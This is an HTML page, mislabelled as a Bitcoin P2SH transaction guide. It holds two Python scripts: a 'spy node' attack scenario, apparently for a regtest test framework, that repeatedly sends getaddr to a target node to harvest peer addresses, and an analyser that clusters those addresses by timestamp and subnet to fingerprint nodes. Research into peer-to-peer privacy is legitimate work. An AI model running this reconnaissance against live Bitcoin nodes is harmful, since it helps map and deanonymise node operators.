<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bitcoin P2SH Transaction Creation Guide</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        h1 {
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
            margin-bottom: 30px;
        }

        h2 {
            color: #2c3e50;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }

        h3 {
            color: #34495e;
            margin-top: 25px;
        }

        pre {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #dee2e6;
            position: relative;
        }

        code {
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
            font-size: 14px;
            color: #24292e;
        }

        .note {
            background-color: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 4px 4px 0;
        }

        .important {
            background-color: #d4edda;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 4px 4px 0;
        }

        ul, ol {
            padding-left: 25px;
        }

        li {
            margin-bottom: 8px;
        }
    </style>
</head>
<body>
    <div class="container">

        <h3>P2SH</h3>

        <img src="adr.png" alt="First image">
        <pre>
        <code>
#!/usr/bin/env python3

from time import sleep
from commander import Commander
from test_framework import messages
from test_framework.p2p import P2PInterface
from test_framework.messages import msg_getaddr


class SpyNode(P2PInterface):
    def __init__(self):
        super().__init__()
        self.addr_received = []
        self.connection_count = 0

    def on_addr(self, message):
        """Store received addresses"""
        for addr in message.addrs:
            self.addr_received.append({
                'ip': addr.ip,
                'port': addr.port,
                'time': addr.time,
                'services': addr.nServices,
                'connection': self.connection_count
            })
        
    def on_version(self, message):
        """Handle version and immediately request addresses"""
        super().on_version(message)
        self.send_message(msg_getaddr())


class AddrSpyScenario(Commander):
    def set_test_params(self):
        self.num_nodes = 1
        
    def add_options(self, parser):
        parser.add_argument(
            "--target",
            dest="target",
            default="tank-0000",
            help="Target node to spy on",
        )
        parser.add_argument(
            "--attempts",
            dest="attempts",
            type=int,
            default=10,
            help="Number of connection attempts",
        )
        parser.add_argument(
            "--delay",
            dest="delay",
            type=int,
            default=2,
            help="Delay between connections",
        )

    def run_test(self):
        # Get target node info
        target_node = None
        target_name = getattr(self.options, 'target', 'tank-0000')
        
        # Find target node
        for node in self.nodes:
            if node.tank == target_name:
                target_node = node
                break
                
        if not target_node:
            self.log.error(f"Target node {target_name} not found")
            return
            
        host = target_node.rpchost
        port = 18444
        
        self.log.info(f"Starting address spy attack on {target_name} ({host}:{port})")
        self.log.info("This demonstrates how a spy node can harvest network information")
        
        collected_addresses = {}
        total_connections = 0
        
        for i in range(getattr(self.options, 'attempts', 10)):
            self.log.info(f"\nConnection attempt {i+1}")
            
            try:
                spy = SpyNode()
                spy.connection_count = i + 1
                
                # Connect to target
                spy.peer_connect(
                    dstaddr=host,
                    dstport=port,
                    net="regtest",
                    timeout_factor=self.options.timeout_factor
                )()
                
                # Wait for connection
                spy.wait_for_connect()
                self.log.info(f"Connected to target")
                
                # Wait for verack and addr responses
                spy.wait_for_verack()
                sleep(getattr(self.options, 'delay', 2))
                
                # Process received addresses
                new_addrs = 0
                for addr in spy.addr_received:
                    addr_key = f"{addr['ip']}:{addr['port']}"
                    if addr_key not in collected_addresses:
                        collected_addresses[addr_key] = addr
                        new_addrs += 1
                
                self.log.info(f"Connection {i+1} found {len(spy.addr_received)} addresses ({new_addrs} new)")
                total_connections += 1
                
                # Clean disconnect
                spy.peer_disconnect()
                sleep(1)
                
            except Exception as e:
                self.log.error(f"Error in connection attempt {i+1}: {str(e)}")
                self.log.error("Exception details:", exc_info=True)

        # Print summary
        self.log.info("\nAddress Spy Attack Summary")
        self.log.info("=" * 50)
        self.log.info(f"Target Node: {target_name}")
        self.log.info(f"Total Connections Made: {total_connections}")
        self.log.info(f"Unique Addresses Discovered: {len(collected_addresses)}")
        self.log.info("\nDiscovered Network Information:")
        
        for addr_key, addr in collected_addresses.items():
            self.log.info(f"Node: {addr_key}")
            self.log.info(f"  First seen in connection: {addr['connection']}")
            self.log.info(f"  Services: {addr['services']}")
            self.log.info(f"  Timestamp: {addr['time']}")
            self.log.info("")


def main():
    AddrSpyScenario().main()


if __name__ == "__main__":
    main()

        </code>
        </pre>

    </div>
    <div>
        <h3>
            Analyze timestamp
        </h3>
        <pre>
            <code>
from datetime import datetime
import numpy as np
from collections import defaultdict
from getaddr_test import send_getaddr    


def analyze_timestamps(addresses, time_threshold=300):
    timestamp_groups = defaultdict(list)
    
    for addr in addresses:
        try:
            # Parse the timestamp string into a datetime object
            dt = datetime.strptime(addr['timestamp'], '%Y-%m-%d %H:%M:%S')
            unix_ts = int(dt.timestamp())
            
            timestamp_groups[unix_ts].append({
                'ip': addr['ip'],
                'port': addr['port'],
                'services': addr['services']
            })
        except (ValueError, TypeError) as e:
            print(f"Error processing timestamp for address: {addr}")
            continue
    
    print(f"\nAnalyzing {len(addresses)} addresses for timestamp correlations...")
    print(f"Using time threshold of {time_threshold} seconds")
    
    # Find related timestamps
    correlated_nodes = []
    timestamps = sorted(timestamp_groups.keys())
    
    for i in range(len(timestamps)):
        current_group = []
        base_ts = timestamps[i]
        
        for j in range(i + 1, len(timestamps)):
            if timestamps[j] - base_ts <= time_threshold:
                if not current_group:
                    current_group.extend(timestamp_groups[base_ts])
                current_group.extend(timestamp_groups[timestamps[j]])
            else:
                break
        
        if current_group:
            correlated_nodes.append({
                'timestamp': datetime.fromtimestamp(base_ts).strftime('%Y-%m-%d %H:%M:%S'),
                'nodes': current_group,
                'count': len(current_group)
            })
    
    # Print findings
    if correlated_nodes:
        print("\nFound potentially correlated nodes:")
        for group in correlated_nodes:
            print(f"\nTimestamp cluster at {group['timestamp']} with {group['count']} nodes:")
            for node in group['nodes'][:5]:  # Show first 5 nodes in each group
                print(f"  IP: {node['ip']}:{node['port']} Services: {node['services']}")
            if len(group['nodes']) > 5:
                print(f"  ... and {len(group['nodes']) - 5} more nodes")
    else:
        print("\nNo suspicious timestamp correlations found")
    
    return correlated_nodes


def detect_fingerprinting(addresses):
    print("\nAnalyzing for potential fingerprinting patterns...")
    
    # Group by /16 subnets
    subnet_groups = defaultdict(list)
    for addr in addresses:
        try:
            if '::ffff:' in addr['ip']:  # Handle IPv4-mapped-IPv6 addresses
                ip_parts = addr['ip'].split(':')[-1].split('.')
                subnet = '.'.join(ip_parts[:2])
                subnet_groups[subnet].append(addr)
        except Exception as e:
            print(f"Error processing IP address: {addr}")
            continue
    
    suspicious_patterns = []
    
    for subnet, nodes in subnet_groups.items():
        if len(nodes) < 3:  # Need at least 3 nodes for meaningful analysis
            continue
        
        # Analyze timestamp patterns
        timestamps = []
        for node in nodes:
            try:
                dt = datetime.strptime(node['timestamp'], '%Y-%m-%d %H:%M:%S')
                timestamps.append(int(dt.timestamp()))
            except (ValueError, TypeError) as e:
                print(f"Error processing timestamp in subnet analysis: {node}")
                continue
        
        if len(timestamps) < 3:  # Skip if we don't have enough valid timestamps
            continue
            
        timestamps.sort()
        time_diffs = np.diff(timestamps)
        
        if len(time_diffs) > 0:
            mean_diff = np.mean(time_diffs)
            std_diff = np.std(time_diffs)
            
            # Check for suspiciously regular patterns
            if std_diff < mean_diff * 0.1:
                suspicious_patterns.append({
                    'subnet': subnet,
                    'node_count': len(nodes),
                    'mean_time_diff': mean_diff,
                    'std_diff': std_diff,
                    'nodes': nodes
                })
    
    # Print findings
    if suspicious_patterns:
        print("\nFound suspicious patterns that might indicate fingerprinting:")
        for pattern in suspicious_patterns:
            print(f"\nSubnet: {pattern['subnet']}")
            print(f"Node count: {pattern['node_count']}")
            print(f"Mean time difference: {pattern['mean_time_diff']:.2f} seconds")
            print(f"Time difference standard deviation: {pattern['std_diff']:.2f}")
            print("Sample nodes:")
            for node in pattern['nodes'][:3]:  # Show first 3 nodes
                print(f"  IP: {node['ip']}:{node['port']} Time: {node['timestamp']}")
    else:
        print("\nNo suspicious fingerprinting patterns detected")
    
    return suspicious_patterns


if __name__ == "__main__":
    print("Fetching addresses from Bitcoin network...")
    addresses = send_getaddr()
    
    if addresses:
        print(f"\nReceived {len(addresses)} addresses")
        
        # Analyze timestamp correlations
        correlated = analyze_timestamps(addresses)
        
        # Look for fingerprinting patterns
        suspicious = detect_fingerprinting(addresses)
        
        # Print summary
        print("\nAnalysis Summary:")
        print(f"Total addresses analyzed: {len(addresses)}")
        print(f"Correlated timestamp groups found: {len(correlated)}")
        print(f"Suspicious fingerprinting patterns found: {len(suspicious)}")
    else:
        print("No addresses received to analyze")
            </code>
        </pre>
    </div>

        <div>
            <a href="address.html">Contact</a>
        </div>
</body>
</html>